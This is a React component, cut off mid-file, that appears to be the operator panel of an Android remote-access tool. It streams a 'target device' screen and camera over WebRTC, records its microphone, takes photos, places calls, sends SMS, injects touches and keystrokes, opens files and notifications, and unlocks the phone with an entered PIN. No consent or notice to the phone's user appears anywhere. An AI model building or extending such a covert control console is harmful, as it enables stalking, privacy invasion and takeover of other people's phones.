import React, { useRef, useState, useEffect } from 'react';
import { useWebRTC } from '../hooks/useWebRTC';
import { 
  Play, 
  Square, 
  Smartphone, 
  Bell, 
  Camera, 
  Volume2, 
  Folder, 
  Settings, 
  Radio, 
  Battery, 
  HardDrive, 
  Cpu, 
  LogOut,
  AppWindow,
  Power,
  ChevronLeft,
  Home,
  Menu,
  Keyboard,
  PhoneCall,
  MessageSquare,
  Mic,
  Video,
  VideoOff,
  Sun,
  X,
  Sliders,
  Tv,
  Activity,
  ShieldCheck,
  Send,
  Minimize2,
  Maximize2,
  Maximize,
  Unlock
} from 'lucide-react';

export default function DeviceControlPanel({ 
  socket,
  session,
  device, 
  screenFrame, 
  cameraFrame, 
  systemStats, 
  isScreenMirroring, 
  isCameraStreaming, 
  onSendCommand, 
  onDisconnect,
  onOpenFiles,
  onOpenNotifications,
  onOpenApps
}) {
  const imageRef = useRef(null);
  const windowRef = useRef(null);
  const videoRef = useRef(null);
  const audioRef = useRef(null);

  const { startWebRTC, stopWebRTC, stream } = useWebRTC(socket, session?.id);
  const hasStarted = useRef(false);
  const previousMode = useRef(null);

  useEffect(() => {
    if (stream) {
      [videoRef.current, audioRef.current].forEach(el => {
        if (el) {
          el.srcObject = stream;
          el.onloadedmetadata = () => el.play().catch(e => {});
          el.play().catch(e => {});
        }
      });
    }
  }, [stream]);

  useEffect(() => {
    let active = true;
    
    // Determine current active mode
    let mode = null;
    if (isCameraStreaming) mode = 'camera';
    else if (isScreenMirroring) mode = 'screen';

    const manageStream = async () => {
      if (mode && socket && session) {
        if (previousMode.current !== mode) {
          if (hasStarted.current) {
            stopWebRTC();
            hasStarted.current = false;
          }
          
          await new Promise(r => setTimeout(r, 800)); // Wait for Android camera/screen to initialize
          await startWebRTC();
          if (active) {
            hasStarted.current = true;
            previousMode.current = mode;
          }
        } else if (!hasStarted.current) {
          await new Promise(r => setTimeout(r, 800)); // Wait for Android camera/screen to initialize
          await startWebRTC();
          if (active) {
            hasStarted.current = true;
            previousMode.current = mode;
          }
        }
      } else {
        if (hasStarted.current) {
          stopWebRTC();
          hasStarted.current = false;
          previousMode.current = null;
        }
      }
    };
    
    manageStream();
    return () => { active = false; };
  }, [isCameraStreaming, isScreenMirroring, socket, session, startWebRTC, stopWebRTC]);

  const [inputText, setInputText] = useState('');
  const [showKeyboardInput, setShowKeyboardInput] = useState(false);
  const [showMirrorModal, setShowMirrorModal] = useState(false);
  const [mirrorMode, setMirrorMode] = useState('screen'); // 'screen' | 'camera'
  
  // Phone / SMS state
  const [phoneNumber, setPhoneNumber] = useState('');
  const [smsText, setSmsText] = useState('');
  const [activePhoneTab, setActivePhoneTab] = useState('call'); // call | sms
  const [cameraFacing, setCameraFacing] = useState(0); // 0 = Back, 1 = Front

  // Drag interaction state
  const [dragStart, setDragStart] = useState(null);
  const [touchIndicator, setTouchIndicator] = useState(null);

  // Window position & size states (from previous client)
  const [viewport, setViewport] = useState({
    width: typeof window !== 'undefined' ? window.innerWidth : 1024,
    height: typeof window !== 'undefined' ? window.innerHeight : 768,
  });

  useEffect(() => {
    const handleResize = () => {
      setViewport({
        width: window.innerWidth,
        height: window.innerHeight,
      });
    };
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  const [windowState, setWindowState] = useState({
    isMinimized: false,
    isMaximized: false,
    isFullscreen: false,
    position: { 
      x: window.innerWidth < 768 ? 10 : window.innerWidth - 420, 
      y: window.innerWidth < 768 ? 80 : 40 
    },
    size: { 
      width: window.innerWidth < 768 ? window.innerWidth - 20 : 360, 
      height: window.innerWidth < 768 ? window.innerHeight - 150 : 700 
    },
  });

  useEffect(() => {
    setWindowState(prev => {
      if (prev.isMaximized || prev.isFullscreen) return prev;
      const isMobile = viewport.width < 768;
      
      const maxX = viewport.width - prev.size.width;
      const maxY = viewport.height - prev.size.height;
      const newX = Math.max(10, Math.min(prev.position.x, maxX > 10 ? maxX : 10));
      const newY = Math.max(10, Math.min(prev.position.y, maxY > 10 ? maxY : 10));
      
      const targetWidth = isMobile ? Math.min(prev.size.width, viewport.width - 20) : prev.size.width;
      const targetHeight = isMobile ? Math.min(prev.size.height, viewport.height - 100) : prev.size.height;
      
      if (
        newX !== prev.position.x || 
        newY !== prev.position.y ||
        targetWidth !== prev.size.width ||
        targetHeight !== prev.size.height
      ) {
        return {
          ...prev,
          position: { x: newX, y: newY },
          size: { width: targetWidth, height: targetHeight }
        };
      }
      return prev;
    });
  }, [viewport.width, viewport.height]);

  const [isDraggingWindow, setIsDraggingWindow] = useState(false);
  const [isResizing, setIsResizing] = useState(false);
  const [dragOffset, setDragOffset] = useState({ x: 0, y: 0 });
  const [resizeStart, setResizeStart] = useState(null);
  const [showPinModal, setShowPinModal] = useState(false);
  const [pin, setPin] = useState('');
  const [unlockType, setUnlockType] = useState('PIN');
  const [isLocked, setIsLocked] = useState(false);
  const [isScreenOn, setIsScreenOn] = useState(true);

  // Automatically start screen share when mirror modal is opened in screen mode
  useEffect(() => {
    if (showMirrorModal && mirrorMode === 'screen' && !isScreenMirroring) {
      onSendCommand('CONTROL_START');
    }
  }, [showMirrorModal, mirrorMode, isScreenMirroring, onSendCommand]);

  // Open modal when screen mirroring starts
  useEffect(() => {
    if (isScreenMirroring) {
      setMirrorMode('screen');
      setShowMirrorModal(true);
    }
  }, [isScreenMirroring]);

  // Open modal when camera streaming starts
  useEffect(() => {
    if (isCameraStreaming) {
      setMirrorMode('camera');
      setShowMirrorModal(true);
    }
  }, [isCameraStreaming]);

  const handleCloseModal = () => {
    setShowMirrorModal(false);
    if (mirrorMode === 'screen' || isScreenMirroring) {
      onSendCommand('SCREEN_SHARE_STOP');
    }
    if (mirrorMode === 'camera' || isCameraStreaming) {
      onSendCommand('CAMERA_STREAM_STOP');
    }
  };

  // Sync isLocked/isScreenOn with systemStats
  useEffect(() => {
    if (systemStats?.isLocked !== undefined) setIsLocked(systemStats.isLocked);
    if (systemStats?.isScreenOn !== undefined) setIsScreenOn(systemStats.isScreenOn);
  }, [systemStats?.isLocked, systemStats?.isScreenOn]);

  // Window drag handlers
  const handleTitleBarPointerDown = (e) => {
    if (windowState.isMaximized || windowState.isFullscreen) return;
    setIsDraggingWindow(true);
    const rect = windowRef.current.getBoundingClientRect();
    setDragOffset({ x: e.clientX - rect.left, y: e.clientY - rect.top });
    try {
      e.currentTarget.setPointerCapture(e.pointerId);
    } catch (err) {}
  };

  useEffect(() => {
    if (!isDraggingWindow) return;
    
    const handlePointerMove = (e) => {
      setWindowState(prev => ({
        ...prev,
        position: { x: e.clientX - dragOffset.x, y: e.clientY - dragOffset.y }
      }));
    };
    
    const handlePointerUp = () => setIsDraggingWindow(false);
    
    document.addEventListener('pointermove', handlePointerMove);
    document.addEventListener('pointerup', handlePointerUp);
    document.addEventListener('pointercancel', handlePointerUp);
    return () => {
      document.removeEventListener('pointermove', handlePointerMove);
      document.removeEventListener('pointerup', handlePointerUp);
      document.removeEventListener('pointercancel', handlePointerUp);
    };
  }, [isDraggingWindow, dragOffset]);

  // Resize handlers
  const handleResizePointerDown = (e) => {
    if (windowState.isMaximized || windowState.isFullscreen) return;
    e.stopPropagation();
    setIsResizing(true);
    const rect = windowRef.current.getBoundingClientRect();
    setResizeStart({ x: e.clientX, y: e.clientY, width: rect.width, height: rect.height });
    try {
      e.currentTarget.setPointerCapture(e.pointerId);
    } catch (err) {}
  };

  useEffect(() => {
    if (!isResizing || !resizeStart) return;
    
    const handlePointerMove = (e) => {
      const deltaX = e.clientX - resizeStart.x;
      const deltaY = e.clientY - resizeStart.y;
      const newWidth = Math.max(280, Math.min(800, resizeStart.width + deltaX));
      const newHeight = Math.max(500, Math.min(1200, resizeStart.height + deltaY));
      setWindowState(prev => ({ ...prev, size: { width: newWidth, height: newHeight } }));
    };
    
    const handlePointerUp = () => {
      setIsResizing(false);
      setResizeStart(null);
    };
    
    document.addEventListener('pointermove', handlePointerMove);
    document.addEventListener('pointerup', handlePointerUp);
    document.addEventListener('pointercancel', handlePointerUp);
    return () => {
      document.removeEventListener('pointermove', handlePointerMove);
      document.removeEventListener('pointerup', handlePointerUp);
      document.removeEventListener('pointercancel', handlePointerUp);
    };
  }, [isResizing, resizeStart]);

  // Window minimize/maximize/fullscreen
  const toggleMinimize = () => setWindowState(prev => ({ ...prev, isMinimized: !prev.isMinimized }));
  const toggleMaximize = () => setWindowState(prev => ({ ...prev, isMaximized: !prev.isMaximized }));
  const toggleFullscreen = () => setWindowState(prev => ({ ...prev, isFullscreen: !prev.isFullscreen }));

  const handleUnlock = () => {
    if (!pin) return;
    onSendCommand('CUSTOM', {
      action: 'UNLOCK_WITH_PIN',
      pin: pin,
      type: unlockType
    });
    setPin('');
    setShowPinModal(false);
  };

  const handlePhoneButton = (type) => {
    let keyCode = -1;
    switch (type) {
      case 'home': keyCode = 3; break;
      case 'back': keyCode = 4; break;
      case 'recent': keyCode = 187; break;
      case 'notification': keyCode = 83; break;
      case 'power': keyCode = 26; break;
      case 'volume_up': keyCode = 24; break;
      case 'volume_down': keyCode = 25; break;
      default: break;
    }

    if (keyCode !== -1) {
      onSendCommand('KEY_EVENT', { keyCode });
    }
  };

  const handleWakeUp = () => {
    onSendCommand('CUSTOM', { action: 'WAKE_UP' });
    setTimeout(() => setShowPinModal(true), 1500);
  };

  // Keyboard Support
  useEffect(() => {
    if (!showMirrorModal || mirrorMode !== 'screen' || windowState.isMinimized) return;

    const handleKeyDown = (e) => {
      if (['INPUT', 'TEXTAREA'].includes(document.activeElement.tagName)) return;
      
      if (e.key === 'Backspace') {
        onSendCommand('KEY_EVENT', { keyCode: 67 });
        return;
      }
      if (e.key === 'Enter') {
        onSendCommand('KEY_EVENT', { keyCode: 66 });
        return;
      }
      if (e.key === 'Escape') {
        handlePhoneButton('back');
        return;
      }

      if (e.key.length === 1) {
        onSendCommand('TYPE_TEXT', { text: e.key });
      }
    };

    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [showMirrorModal, mirrorMode, windowState.isMinimized]);

  // Screen interaction (touch/drag/swipe support from previous client)
  const handleInteraction = (e, type) => {
    const activeRef = (mirrorMode === 'screen' && isScreenMirroring) || (mirrorMode === 'camera' && isCameraStreaming) ? videoRef : imageRef;
    if (!activeRef.current) return;

    const clientX = e.clientX;
    const clientY = e.clientY;
    const rect = activeRef.current.getBoundingClientRect();

    if (type === 'down') {
      try { e.currentTarget.setPointerCapture(e.pointerId); } catch(err) {}
    }

    const screenWidth = systemStats?.screenWidth || 1080;
    const screenHeight = systemStats?.screenHeight || 1920;

    const containerRatio = rect.width / rect.height;
    const streamRatio = screenWidth / screenHeight;

    let displayedWidth = rect.width;
    let displayedHeight = rect.height;
    let offsetX = 0;
    let offsetY = 0;

    if (containerRatio > streamRatio) {
      displayedWidth = rect.height * streamRatio;
      offsetX = (rect.width - displayedWidth) / 2;
    } else {
      displayedHeight = rect.width / streamRatio;
      offsetY = (rect.height - displayedHeight) / 2;
    }

    const relX = clientX - rect.left - offsetX;
    let relY = clientY - rect.top - offsetY;

    relY += displayedHeight * 0.02; // small y-correction

    const normX = Math.max(0, Math.min(1, relX / displayedWidth));
    const normY = Math.max(0, Math.min(1, relY / displayedHeight));
    
    if (type === 'down') {
      setDragStart({ x: normX, y: normY, time: Date.now() });
    } else if (type === 'up' || type === 'leave' || type === 'cancel') {
      if (!dragStart) return;
      
      const duration = Date.now() - dragStart.time;
      const dist = Math.sqrt(Math.pow(normX - dragStart.x, 2) + Math.pow(normY - dragStart.y, 2));

      if (type === 'up') {
        setTouchIndicator({ x: clientX - rect.left, y: clientY - rect.top });
        setTimeout(() => setTouchIndicator(null), 300);
      }

      const isInside = normX >= 0 && normX <= 1 && normY >= 0 && normY <= 1;

      if (type === 'up' && dist < 0.02 && isInside) {
        if (duration < 500) {
          onSendCommand('TOUCH_CLICK', { x: normX, y: normY, normalized: true });
        } else {
          onSendCommand('TOUCH_LONG_PRESS', { x: normX, y: normY, normalized: true });
        }
      } else if (dist >= 0.02) {
        onSendCommand('TOUCH_SWIPE', { 
            x1: dragStart.x, y1: dragStart.y, 
            x2: normX, y2: normY, 
            duration: Math.max(duration, 250),
            normalized: true 
        });
      }
      setDragStart(null);
    }
  };

  const getWindowStyle = () => {
    const isMobile = viewport.width < 768;
    
    if (windowState.isFullscreen || isMobile) {
      return { 
        position: 'fixed', 
        inset: 0, 
        width: '100vw', 
        height: '100vh', 
        zIndex: 300,
        borderRadius: '0px',
        border: 'none',
        boxShadow: 'none'
      };
    }
    if (windowState.isMaximized) {
      return { 
        position: 'fixed', 
        left: '50%', 
        top: '50%', 
        transform: 'translate(-50%, -50%)', 
        width: '90vw', 
        maxWidth: '420px', 
        height: '90vh', 
        zIndex: 300,
        boxShadow: '0 0 50px rgba(232, 98, 42, 0.3)',
        borderRadius: '32px'
      };
    }
    return {
      position: 'fixed',
      left: `${windowState.position.x}px`,
      top: `${windowState.position.y}px`,
      width: `${windowState.size.width}px`,
      height: `${windowState.size.height}px`,
      zIndex: 200
    };
  };

  const handleSendText = () => {
    if (!inputText.trim()) return;
    onSendCommand('TYPE_TEXT', { text: inputText });
    setInputText('');
  };

  const handleHardwareKey = (keyCode) => {
    onSendCommand('KEY_EVENT', { keyCode });
  };

  const handleMakeCall = (e) => {
    e.preventDefault();
    if (!phoneNumber.trim()) return;
    onSendCommand('MAKE_CALL', { phone: phoneNumber });
  };

  const handleSendSMS = (e) => {
    e.preventDefault();
    if (!phoneNumber.trim() || !smsText.trim()) return;
    onSendCommand('SEND_SMS', { phone: phoneNumber, message: smsText });
    setSmsText('');
  };

  const handleAudioRecord = () => {
    onSendCommand('AUDIO_RECORD');
  };

  const toggleCameraStream = () => {
    if (isCameraStreaming) {
      onSendCommand('CAMERA_STREAM_STOP');
    } else {
      if (isScreenMirroring) {
        onSendCommand('SCREEN_SHARE_STOP');
      }
      setMirrorMode('camera');
      onSendCommand('CAMERA_STREAM_START', { facing: cameraFacing });
      setShowMirrorModal(true);
    }
  };

  // Extract battery numeric percentage
  const getBatteryVal = () => {
    if (systemStats?.batteryLevel !== undefined) return systemStats.batteryLevel;
    return 84;
  };

  return (
    <div className="flex flex-col gap-8 w-full animate-fade-in">
      {/* Top Banner / Device Connection Info */}
      <div className="glass-card p-6 bg-white/70 dark:bg-[#23140c]/40 border border-[#E8622A]/10 dark:border-[#E8622A]/20 rounded-3xl shadow-sm flex flex-col md:flex-row md:items-center justify-between gap-6">
        <div className="flex items-center gap-4">
          <div className="w-14 h-14 bg-gradient-to-tr from-[#E8622A] to-[#F59E0B] rounded-2xl flex items-center justify-center shadow-lg shadow-[#E8622A]/20 text-white animate-pulse shrink-0">
            <Smartphone className="w-7 h-7" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h2 className="text-lg font-black text-[#2C1A0E] dark:text-white leading-none">
                {device?.deviceName || 'Active Phone'}
              </h2>
              <span className="flex h-2 w-2 relative">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
              </span>
            </div>
            <p className="text-xs text-[#7C5C44] dark:text-[#C4A992] mt-1.5 font-mono">
              Model: <span className="font-bold text-[#E8622A]">{device?.deviceModel || 'N/A'}</span> • OS: <span className="font-bold text-[#E8622A]">Android {device?.osVersion || 'N/A'}</span>
            </p>
          </div>
        </div>

        <div className="flex flex-col sm:flex-row items-stretch sm:items-center gap-3 w-full sm:w-auto">
          <button 
            onClick={() => {
              if (isCameraStreaming) {
                onSendCommand('CAMERA_STREAM_STOP');
              }
              setMirrorMode('screen');
              setShowMirrorModal(true);
            }}
            className="flex items-center justify-center gap-2 px-5 py-3 bg-gradient-to-r from-[#E8622A] to-[#F59E0B] hover:from-[#D04F18] hover:to-[#D97706] text-white rounded-2xl text-xs font-black shadow-lg shadow-[#E8622A]/20 transition-all hover:scale-[1.02] cursor-pointer w-full sm:w-auto"
          >
            <Tv className="w-4 h-4" /> Launch Screen Controller
          </button>
          
          <button 
            onClick={onDisconnect}
            className="flex items-center justify-center gap-1.5 px-4 py-3 bg-rose-600/10 hover:bg-rose-600 border border-rose-500/15 text-rose-600 hover:text-white dark:text-rose-400 dark:hover:text-white rounded-2xl text-xs font-black transition-all cursor-pointer w-full sm:w-auto"
          >
            <LogOut className="w-4 h-4" /> Disconnect
          </button>
        </div>
      </div>

      {/* Grid of Vitals (Telemetry Stats) */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
        {/* Battery */}
        <div className="glass-card p-5 bg-white dark:bg-[#23140c]/40 border border-[#E8622A]/10 dark:border-[#E8622A]/20 rounded-2xl shadow-sm">
          <div className="flex items-center justify-between text-[#7C5C44] dark:text-[#C4A992] mb-3">
            <span className="text-[10px] font-black uppercase tracking-wider font-mono">Power status</span>
            <Battery className="w-4 h-4 text-[#E8622A]" />
          </div>
          <div className="flex items-baseline gap-1">
            <span className="text-2xl font-black text-[#2C1A0E] dark:text-white font-mono">{getBatteryVal()}%</span>
            <span className="text-[10px] text-[#7C5C44]">capacity</span>
          </div>
          <div className="w-full bg-[#FDF8F4] dark:bg-[#180d07] h-2 rounded-full mt-4 overflow-hidden border border-[#E8622A]/5">
            <div 
              className="bg-gradient-to-r from-[#E8622A] to-[#F59E0B] h-full rounded-full transition-all duration-500" 
              style={{ width: `${getBatteryVal()}%` }}
            />
          </div>
        </div>

        {/* Storage */}
        <div className="glass-card p-5 bg-white dark:bg-[#23140c]/40 border border-[#E8622A]/10 dark:border-[#E8622A]/20 rounded-2xl shadow-sm">
          <div className="flex items-center justify-between text-[#7C5C44] dark:text-[#C4A992] mb-3">
            <span className="text-[10px] font-black uppercase tracking-wider font-mono">Storage space</span>
            <HardDrive className="w-4 h-4 text-[#F59E0B]" />
          </div>
          <div className="flex items-baseline gap-1">
            <span className="text-2xl font-black text-[#2C1A0E] dark:text-white font-mono">
              {systemStats?.availableStorage || '12.8 GB'}
            </span>
            <span className="text-[10px] text-[#7C5C44]">free</span>
          </div>
          <div className="w-full bg-[#FDF8F4] dark:bg-[#180d07] h-2 rounded-full mt-4 overflow-hidden border border-[#E8622A]/5">
            <div className="bg-gradient-to-r from-[#F59E0B] to-[#E8622A] h-full rounded-full w-[45%]" />
          </div>
        </div>

        {/* Memory */}
        <div className="glass-card p-5 bg-white dark:bg-[#23140c]/40 border border-[#E8622A]/10 dark:border-[#E8622A]/20 rounded-2xl shadow-sm">
          <div className="flex items-center justify-between text-[#7C5C44] dark:text-[#C4A992] mb-3">
            <span className="text-[10px] font-black uppercase tracking-wider font-mono">RAM Consumption</span>
            <Cpu className="w-4 h-4 text-emerald-500" />
          </div>
          <div className="flex items-baseline gap-1">
            <span className="text-2xl font-black text-[#2C1A0E] dark:text-white font-mono">
              {systemStats?.ramUsage || '4.2 GB'}
            </span>
            <span className="text-[10px] text-[#7C5C44]">active</span>
          </div>
          <div className="w-full bg-[#FDF8F4] dark:bg-[#180d07] h-2 rounded-full mt-4 overflow-hidden border border-[#E8622A]/5">
            <div className="bg-gradient-to-r from-emerald-500 to-teal-500 h-full rounded-full w-[60%]" />
          </div>
        </div>

        {/* Signal */}
        <div className="glass-card p-5 bg-white dark:bg-[#23140c]/40 border border-[#E8622A]/10 dark:border-[#E8622A]/20 rounded-2xl shadow-sm">
          <div className="flex items-center justify-between text-[#7C5C44] dark:text-[#C4A992] mb-3">
            <span className="text-[10px] font-black uppercase tracking-wider font-mono">Signal telemetry</span>
            <Radio className="w-4 h-4 text-[#E8622A]" />
          </div>
          <div className="flex items-baseline gap-1">
            <span className="text-2xl font-black text-[#2C1A0E] dark:text-white font-mono">
              {systemStats?.networkType || 'Wi-Fi'}
            </span>
            <span className="text-[10px] text-[#7C5C44]">online</span>
          </div>
          <div className="w-full bg-[#FDF8F4] dark:bg-[#180d07] h-2 rounded-full mt-4 overflow-hidden border border-[#E8622A]/5">
            <div className="bg-gradient-to-r from-[#E8622A] to-emerald-500 h-full rounded-full w-[85%]" />
          </div>
        </div>
      </div>

      {/* Main Command Grid Layout */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 items-stretch">
        
        {/* Card 1: Camera Streaming Controls */}
        <div className="glass-card p-6 bg-white dark:bg-[#23140c]/40 border border-[#E8622A]/10 dark:border-[#E8622A]/20 rounded-2xl shadow-sm flex flex-col justify-between min-h-[280px]">
          <div>
            <div className="flex items-center gap-2 mb-4 border-b border-[#E8622A]/10 dark:border-[#E8622A]/20 pb-3">
              <Camera className="w-4.5 h-4.5 text-[#E8622A]" />
              <h3 className="text-xs font-black tracking-wider text-[#7C5C44] dark:text-[#C4A992] uppercase font-mono">Live Camera Feed</h3>
            </div>
            
            <p className="text-xs text-[#7C5C44] dark:text-[#C4A992] leading-relaxed mb-4">
              Switch between front and back camera lenses and start streaming visual data from target device.
            </p>

            <div className="flex gap-2 mb-4">
              <button 
                onClick={() => setCameraFacing(0)}
                className={`flex-1 py-2 rounded-xl text-xs font-bold border transition-all cursor-pointer ${
                  cameraFacing === 0 
                    ? 'bg-[#E8622A]/15 border-[#E8622A]/30 text-[#E8622A]' 
                    : 'bg-[#FDF8F4] dark:bg-[#180d07] border-[#E8622A]/10 text-[#7C5C44] dark:text-[#C4A992]'
                }`}
              >
                Back Lens
              </button>
              <button 
                onClick={() => setCameraFacing(1)}
                className={`flex-1 py-2 rounded-xl text-xs font-bold border transition-all cursor-pointer ${
                  cameraFacing === 1 
                    ? 'bg-[#E8622A]/15 border-[#E8622A]/30 text-[#E8622A]' 
                    : 'bg-[#FDF8F4] dark:bg-[#180d07] border-[#E8622A]/10 text-[#7C5C44] dark:text-[#C4A992]'
                }`}
              >
                Front Lens
              </button>
            </div>
          </div>

          <button 
            onClick={toggleCameraStream}
            className={`w-full py-2.5 rounded-xl border flex items-center justify-center gap-2 text-xs font-bold uppercase transition-all cursor-pointer ${
              isCameraStreaming 
                ? 'bg-rose-600/10 border-rose-500/30 text-rose-600 hover:bg-rose-600 hover:text-white' 
                : 'bg-gradient-to-r from-[#E8622A] to-[#F59E0B] hover:from-[#D04F18] hover:to-[#D97706] border-transparent text-white shadow-md shadow-[#E8622A]/15'
            }`}
          >
            {isCameraStreaming ? (
              <>
                <VideoOff className="w-4 h-4" /> Stop Stream
              </>
            ) : (
              <>
                <Video className="w-4 h-4" /> Start Live Stream
              </>
            )}
          </button>
        </div>

        {/* Card 2: Calls & SMS Center */}
        <div className="glass-card bg-white dark:bg-[#23140c]/40 border border-[#E8622A]/10 dark:border-[#E8622A]/20 rounded-2xl shadow-sm overflow-hidden flex flex-col justify-between min-h-[280px]">
          <div>
            <div className="flex border-b border-[#E8622A]/10 dark:border-[#E8622A]/20 bg-[#FDF8F4]/40 dark:bg-[#180d07]/40 text-xs">
              <button 
                onClick={() => setActivePhoneTab('call')}
                className={`flex-1 py-3 font-bold transition-all text-center cursor-pointer ${
                  activePhoneTab === 'call' ? 'text-[#E8622A] border-b-2 border-[#E8622A] bg-white dark:bg-[#23140c]/40' : 'text-[#7C5C44] dark:text-[#C4A992] hover:text-[#E8622A]'
                }`}
              >
                Call Dialer
              </button>
              <button 
                onClick={() => setActivePhoneTab('sms')}
                className={`flex-1 py-3 font-bold transition-all text-center cursor-pointer ${
                  activePhoneTab === 'sms' ? 'text-[#E8622A] border-b-2 border-[#E8622A] bg-white dark:bg-[#23140c]/40' : 'text-[#7C5C44] dark:text-[#C4A992] hover:text-[#E8622A]'
                }`}
              >
                SMS Dispatch
              </button>
            </div>

            <div className="p-5">
              {activePhoneTab === 'call' && (
                <form onSubmit={handleMakeCall} className="space-y-4">
                  <div>
                    <label className="text-[9px] font-bold text-[#7C5C44] dark:text-[#C4A992] uppercase font-mono tracking-wider">Dial Number</label>
                    <div className="relative mt-1">
                      <PhoneCall className="w-4 h-4 text-[#7C5C44]/60 absolute left-3 top-2.5" />
                      <input 
                        type="tel"
                        required
                        value={phoneNumber}
                        onChange={(e) => setPhoneNumber(e.target.value)}
                        placeholder="+1 (555) 000-0000"
                        className="w-full bg-[#FDF8F4] dark:bg-[#180d07] border border-[#E8622A]/15 dark:border-[#E8622A]/30 rounded-xl pl-9 pr-3 py-2 text-xs focus:outline-none focus:border-[#E8622A] text-[#2C1A0E] dark:text-[#FFF3EB]"
                      />
                    </div>
                  </div>
                  <button 
                    type="submit"
                    className="w-full py-2 bg-gradient-to-r from-[#E8622A] to-[#F59E0B] hover:from-[#D04F18] hover:to-[#D97706] text-white rounded-xl text-xs font-bold shadow-md shadow-[#E8622A]/10 transition-all cursor-pointer flex items-center justify-center gap-1.5"
                  >
                    <PhoneCall className="w-3.5 h-3.5" /> Outbound Call
                  </button>
                </form>
              )}

              {activePhoneTab === 'sms' && (
                <form onSubmit={handleSendSMS} className="space-y-3">
                  <div>
                    <label className="text-[9px] font-bold text-[#7C5C44] dark:text-[#C4A992] uppercase font-mono tracking-wider">SMS Number</label>
                    <input 
                      type="tel"
                      required
                      value={phoneNumber}
                      onChange={(e) => setPhoneNumber(e.target.value)}
                      placeholder="+1 (555) 000-0000"
                      className="w-full mt-1 bg-[#FDF8F4] dark:bg-[#180d07] border border-[#E8622A]/15 dark:border-[#E8622A]/30 rounded-xl px-3 py-2 text-xs focus:outline-none focus:border-[#E8622A] text-[#2C1A0E] dark:text-[#FFF3EB]"
                    />
                  </div>
                  <div>
                    <label className="text-[9px] font-bold text-[#7C5C44] dark:text-[#C4A992] uppercase font-mono tracking-wider">SMS Body</label>
                    <textarea 
                      required
                      rows={1}
                      value={smsText}
                      onChange={(e) => setSmsText(e.target.value)}
                      placeholder="Type text message..."
                      className="w-full mt-1 bg-[#FDF8F4] dark:bg-[#180d07] border border-[#E8622A]/15 dark:border-[#E8622A]/30 rounded-xl px-3 py-1.5 text-xs focus:outline-none focus:border-[#E8622A] text-[#2C1A0E] dark:text-[#FFF3EB] resize-none"
                    />
                  </div>
                  <button 
                    type="submit"
                    className="w-full py-2 bg-gradient-to-r from-[#E8622A] to-[#F59E0B] hover:from-[#D04F18] hover:to-[#D97706] text-white rounded-xl text-xs font-bold shadow-md shadow-[#E8622A]/10 transition-all cursor-pointer flex items-center justify-center gap-1.5"
                  >
                    <MessageSquare className="w-3.5 h-3.5" /> Dispatch SMS
                  </button>
                </form>
              )}
            </div>
          </div>
        </div>

        {/* Card 3: App Utilities & Hardware Actuators */}
        <div className="glass-card p-6 bg-white dark:bg-[#23140c]/40 border border-[#E8622A]/10 dark:border-[#E8622A]/20 rounded-2xl shadow-sm flex flex-col justify-between min-h-[280px]">
          <div>
            <div className="flex items-center gap-2 mb-4 border-b border-[#E8622A]/10 dark:border-[#E8622A]/20 pb-3">
              <Sliders className="w-4.5 h-4.5 text-[#E8622A]" />
              <h3 className="text-xs font-black tracking-wider text-[#7C5C44] dark:text-[#C4A992] uppercase font-mono">Console Command Center</h3>
            </div>
            
            <div className="grid grid-cols-2 gap-3.5">
              <button 
                onClick={onOpenFiles}
                className="flex flex-col items-center justify-center p-2.5 rounded-xl bg-[#FDF8F4] dark:bg-[#180d07] border border-[#E8622A]/15 dark:border-[#E8622A]/30 text-[#7C5C44] dark:text-[#C4A992] hover:border-[#E8622A] transition-all cursor-pointer"
              >
                <Folder className="w-5 h-5 mb-1.5 text-emerald-500" />
                <span className="text-[9px] font-bold uppercase">Files System</span>
              </button>

              <button 
                onClick={onOpenNotifications}
                className="flex flex-col items-center justify-center p-2.5 rounded-xl bg-[#FDF8F4] dark:bg-[#180d07] border border-[#E8622A]/15 dark:border-[#E8622A]/30 text-[#7C5C44] dark:text-[#C4A992] hover:border-[#E8622A] transition-all cursor-pointer"
              >
                <Bell className="w-5 h-5 mb-1.5 text-[#E8622A]" />
                <span className="text-[9px] font-bold uppercase">View Logs</span>
              </button>

              <button 
                onClick={onOpenApps}
                className="flex flex-col items-center justify-center p-2.5 rounded-xl bg-[#FDF8F4] dark:bg-[#180d07] border border-[#E8622A]/15 dark:border-[#E8622A]/30 text-[#7C5C44] dark:text-[#C4A992] hover:border-[#E8622A] transition-all cursor-pointer"
              >
                <AppWindow className="w-5 h-5 mb-1.5 text-sky-500" />
                <span className="text-[9px] font-bold uppercase">Launch Apps</span>
              </button>

              <button 
                onClick={() => onSendCommand('CAMERA_CAPTURE', { facing: cameraFacing })}
                className="flex flex-col items-center justify-center p-2.5 rounded-xl bg-[#FDF8F4] dark:bg-[#180d07] border border-[#E8622A]/15 dark:border-[#E8622A]/30 text-[#7C5C44] dark:text-[#C4A992] hover:border-[#E8622A] transition-all cursor-pointer"
              >
                <Camera className="w-5 h-5 mb-1.5 text-[#F59E0B]" />
                <span className="text-[9px] font-bold uppercase">Take Photo</span>
              </button>
            </div>
          </div>

          {/* Quick Actuator Actions */}
          <div className="flex flex-col xs:flex-row items-stretch xs:items-center gap-2 border-t border-[#E8622A]/10 dark:border-[#E8622A]/20 pt-4 mt-4">
            <button 
              onClick={handleAudioRecord}
              className="flex-1 py-2 bg-[#FDF8F4] dark:bg-[#180d07] hover:bg-[#FFF9F4] dark:hover:bg-[#301c11] border border-[#E8622A]/20 text-[#2C1A0E] dark:text-[#FFF3EB] rounded-xl text-[10px] font-bold flex items-center justify-center gap-1 transition-all cursor-pointer w-full xs:w-auto"
              title="Record audio from device microphone"
            >
              <Mic className="w-3.5 h-3.5 text-[#E8622A]" /> Record Mic
            </button>
            <button 
              onClick={() => onSendCommand('CUSTOM', { action: 'vibrate' })}
